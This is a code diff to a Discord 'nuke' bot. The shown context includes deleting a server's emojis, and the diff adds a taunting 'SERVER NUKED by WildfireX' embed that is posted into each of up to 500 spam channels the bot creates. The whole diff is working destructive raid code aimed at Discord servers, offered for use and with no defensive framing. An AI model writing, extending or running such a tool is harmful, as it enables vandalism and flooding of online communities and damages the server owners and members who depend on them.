@@ -2,6 +2,29 @@
 // Core nuke logic — exported as a plain async function.
 // Called by the znuke prefix command in index.js.
 
+import { EmbedBuilder } from 'discord.js';
+
+// ─── Build the nuke announcement embed ────────────────────────────────────────
+export function buildNukeEmbed(channelName) {
+  return new EmbedBuilder()
+    .setColor(0xff0000)  // pure red
+    .setTitle('💥 SERVER NUKED')
+    .setDescription('This server has been nuked by WildfireX')
+    .addFields(
+      { name: 'Channel Name', value: channelName, inline: false },
+      { name: 'Nuked By',     value: 'your dad',  inline: false },
+      {
+        name: 'Timestamp',
+        value: new Date().toLocaleString('en-GB', {
+          weekday: 'long', year: 'numeric', month: 'long',
+          day: 'numeric', hour: '2-digit', minute: '2-digit',
+        }),
+        inline: false,
+      },
+    )
+    .setFooter({ text: 'WildfireX Security' });
+}
+
 // ─── Helpers ──────────────────────────────────────────────────────────────────
 
 /**
@@ -68,13 +91,21 @@ export async function nukeServer(guild, botId, channelsToCreate = 0, channelName
     log.push(`😀 **Emojis** — deleted \`${succeeded}\`, failed \`${failed}\``);
   }
 
-  // 5. Spam channels creation
+  // 5. Spam channels creation + post nuke embed in each
   if (channelsToCreate > 0) {
     const count = Math.min(channelsToCreate, 500);
-    const createTasks = Array.from({ length: count }, () =>
-      guild.channels.create({ name: channelName }).catch(() => {}),
-    );
-    const { succeeded, failed } = await runAll(createTasks);
+    const embed = buildNukeEmbed(channelName);
+    const createTasks = Array.from({ length: count }, async () => {
+      try {
+        const ch = await guild.channels.create({ name: channelName });
+        if (ch && typeof ch.send === 'function') {
+          await ch.send({ embeds: [embed] }).catch(() => {});
+        }
+      } catch { /* ignore */ }
+    });
+    const results   = await Promise.allSettled(createTasks);
+    const succeeded = results.filter((r) => r.status === 'fulfilled').length;
+    const failed    = results.filter((r) => r.status === 'rejected').length;
     log.push(`📣 **Spam Channels Created** — \`${succeeded}\` created, failed \`${failed}\``);
   }
 
